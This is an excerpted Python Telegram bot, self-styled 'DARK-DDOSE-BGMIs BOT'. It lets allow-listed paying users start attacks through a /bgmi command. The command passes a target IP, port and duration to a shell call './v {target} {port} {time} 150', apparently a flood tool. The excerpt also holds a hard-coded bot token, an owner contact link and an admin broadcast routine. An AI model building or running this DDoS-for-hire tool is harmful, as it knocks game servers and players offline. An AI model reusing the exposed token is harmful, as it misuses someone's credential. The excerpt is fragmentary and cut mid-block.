...
bot = telebot.TeleBot('7247641708:AAGkd6XvFK6h7DlfoKv73JtZN0ndQlVdb_E')
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 600:
                ...
                full_command = f"./v {target} {port} {time} 150"
...
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝙳𝙰𝚁𝙺-𝙳𝙳𝙾𝚂𝙴-𝙱𝙶𝙼𝙸𝚜 𝙱𝙾𝚃!\n1. /bgmi \n2. /plan\n4. /rules\n𝐃𝐌👇👇\nhttps://t.me/Bgmi_owner_420
...
def broadcast_message(message):
    ...
    if user_id in admin_id:
        ...
        if len(command) > 1:
            message_to_broadcast = "MESSAGE MY 𝐁𝐀𝐃𝐍𝐀𝐌 𝐁𝐀𝐃𝐒𝐇𝐀𝐇\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
